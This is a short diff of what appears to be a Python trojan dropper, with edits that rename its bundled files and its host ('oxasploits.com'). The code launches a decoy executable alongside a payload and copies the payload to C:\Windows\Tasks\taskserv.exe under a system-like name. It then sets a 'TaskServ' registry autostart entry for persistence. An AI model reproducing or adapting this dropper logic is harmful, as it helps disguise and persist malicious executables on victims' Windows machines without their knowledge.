@@ -5,7 +5,7 @@ import shutil
 import subprocess
 from pathlib import Path
 
-host = '01.dev.oxasploits.com'
+host = 'oxasploits.com'
 
 def resource_path(relative_path):
     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
@@ -45,12 +45,12 @@ def check_autostart_registry(value_name):
                 break
     return False
 
-subprocess.Popen(resource_path('.\shell.exe'))
-subprocess.Popen(resource_path('nppi.exe'))
+subprocess.Popen(resource_path('installer.exe'))
+subprocess.Popen(resource_path('phony-bin.exe'))
 
 pwnpath = r'C:\Windows\Tasks\taskserv.exe'
 ppath = Path(pwnpath)
 if not ppath.is_file():
-        shutil.copyfile(resource_path('shell.exe'), pwnpath)
+        shutil.copyfile(resource_path('installer.exe'), pwnpath)
         set_autostart_registry('TaskServ', pwnpath)
 
